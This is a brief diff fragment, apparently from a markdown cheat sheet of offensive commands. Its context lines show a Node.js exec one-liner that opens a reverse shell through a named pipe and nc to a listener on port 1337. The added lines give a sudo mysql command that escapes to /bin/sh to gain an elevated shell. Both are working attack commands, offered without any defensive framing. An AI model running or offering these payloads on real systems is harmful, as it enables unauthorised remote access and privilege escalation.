@@ -15,3 +15,6 @@
 ```
 require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f')
 ```
+```
+sudo /usr/bin/mysql -u newuser -p -e '\! /bin/sh'
+```
